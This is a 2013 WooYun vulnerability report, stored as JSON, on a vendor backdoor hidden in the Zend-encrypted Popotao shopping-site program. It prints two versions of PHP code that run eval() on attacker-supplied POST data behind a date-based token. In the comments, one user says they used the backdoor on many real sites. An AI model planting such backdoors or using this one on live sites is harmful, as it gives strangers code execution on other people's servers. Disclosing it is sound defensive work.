{"id": 14506, "wybug_id": "wooyun-2013-018571", "wybug_title": "泡泡淘（popotao）淘客程序官方后门", "wybug_corp": "泡泡淘", "wybug_author": "路人甲", "wybug_date": "2013-02-10 13:15", "wybug_open_date": "2013-02-20 15:09", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["执行任意代码"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-02-10：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-02-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 泡泡淘是一个蛮不错的淘客建站程序，官方网址：http://www.popotao.com。本人就是他们的用户之一，用他们的程序的网站是：http://www.xiaosajie.com由于官方几个月不更新，跟不上淘宝API的更新速度，所以我想自己解决，把官方的6个ZEND加密过的PHP文件破解了。结果发现了极其恶心的事情。 详细说明：  在include/admin.func.php文件的最下面，发现以下代码，ZEND加密保护版权还有网站授权认证无可厚非。但是利用加密加入后门。就太可耻了。    漏洞证明：  9月27日的补丁版本\nif ( isset( $_POST['_tks'] ) && ( $tks = trim( $_POST['_tks'] ) ) ){    $_tks = explode( \"|\", ~base64_decode( strrev( substr( $tks, 3, 5 ). substr( $tks, 8 ) . substr( $tks, 0, 3 ) ) ) );    if ( trim( $_tks[1] ) == \"K_\".date( \"Y_m_d\" ) && ( strpos( $_SERVER['HTTP_HOST'], trim( $_tks[0] ) ) !== FALSE || strpos( $_SERVER['SERVER_NAME'], trim( $_tks[0] ) ) !== FALSE ) )    {        eval( $_POST['tao'] );    }    exit( );}\n2月4日的补丁\nif ( isset( $_POST['_MDFK'] ) && ( $tks = trim( $_POST['_MDFK'] ) ) ){    $_tks = explode( \"|\", ~base64_decode( strrev( substr( $tks, 3, 5 ). substr( $tks, 8 ) . substr( $tks, 0, 3 ) ) ) );    if ( trim( $_tks[1] ) == \"K_\".date( \"Y_m_d\" ) && ( strpos( $_SERVER['HTTP_HOST'], trim( $_tks[0] ) ) !== FALSE || strpos( $_SERVER['SERVER_NAME'], trim( $_tks[0] ) ) !== FALSE ) )    {        eval( $_POST['_HkBs'] );    }    exit( );}\n   修复方案：  官方恶意行为。不知道怎么修复。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-02-10 13:46 |    \t\toldcat \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:14        )\t\t \n  公开！！！！！    \n     2013-02-11 08:35 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  加密是为了隐藏？！    \n     2013-02-11 20:13 |    \t\t灵魂天使 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | 突然发现 路人甲才是最牛的)\t\t \n  求真相　我也用的这个程序    \n     2013-02-11 22:25 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  @灵魂天使 默哀....    \n     2013-02-11 22:43 |    \t\toldcat \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:14        )\t\t \n  @灵魂天使 默哀....    \n     2013-02-12 21:58 |    \t\t溪水流淌 \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:2        | 如果一切都任我欲为，我会有迷失在这自由深...)\t\t \n  许多程序暗藏后门已经是潜规则了，特别分收费和免费，比如kelink    \n     2013-02-13 09:44 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @灵魂天使 @Coody @溪水流淌 我只能呵呵了    \n     2013-02-13 12:29 |    \t\t灵魂天使 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | 突然发现 路人甲才是最牛的)\t\t \n  @Coody @oldcat @xsser 貌似有人博客8号就公开这个了　检测了好几个后门都用不了　难道又改调用字符了    \n     2013-02-13 12:56 |    \t\toldcat \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:14        )\t\t \n  在include/admin.func.php文件的最下面，存在以下代码。if ( isset( $_POST['_tks'] ) && ( $tks = trim( $_POST['_tks'] ) ) ){$_tks = explode( “|”, ~base64_decode( strrev( substr( $tks, 3, 5 ). substr( $tks, 8 ) . substr( $tks, 0, 3 ) ) ) );if ( trim( $_tks[1] ) == “K_”.date( “Y_m_d” ) && ( strpos( $_SERVER['HTTP_HOST'], trim( $_tks[0] ) ) !== FALSE || strpos( $_SERVER['SERVER_NAME'], trim( $_tks[0] ) ) !== FALSE ) ){eval( $_POST['tao'] );}exit( );}    \n     2013-02-13 13:13 |    \t\t灵魂天使 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | 突然发现 路人甲才是最牛的)\t\t \n  @oldcat 嗯　没升级时试了下　不管用    \n     2013-02-13 14:05 |    \t\t灵魂天使 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | 突然发现 路人甲才是最牛的)\t\t \n  我错了　泡泡淘卑鄙啊　想骂淫 　洞主威武    \n     2013-02-13 14:06 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  @灵魂天使 成功了？    \n     2013-02-13 14:29 |    \t\t灵魂天使 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | 突然发现 路人甲才是最牛的)\t\t \n  @Coody 成功了　换了下调用参数　靠啊　卑鄙 好多网站都成功了    \n     2013-02-13 14:32 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  @灵魂天使 ╮(╯▽╰)╭    \n     2013-02-13 16:37 |    \t\t灵魂天使 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | 突然发现 路人甲才是最牛的)\t\t \n  @Coody 淫荡啊　一个网站一个句话密码　还post什么啊　直接上菜刀了    \n     2013-02-13 17:41 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  @灵魂天使 tao ?    \n     2013-02-15 16:23 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  牛B的路人甲。    \n     2013-02-18 08:45 |    \t\tLeadUrLife \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:14        | 好好学习 天天向上)\t\t \n  @Black Angel 这个路人甲却是牛逼：http://www.sablog.net/blog/archives/604/    \n     2013-02-18 16:22 |    \t\t冷静 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        )\t\t \n  @LeadUrLife 确实牛逼    \n     2013-03-21 02:27 |    \t\talso \t\t\t( 普通白帽子  |\t\t\t        Rank:424 漏洞数:52        | 招渗透/php/前端/ios&android安全，广州地...)\t\t \n  @xsser 下次是zend或者其他加密的，直接解密后，用find来查关键函数，你懂的    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}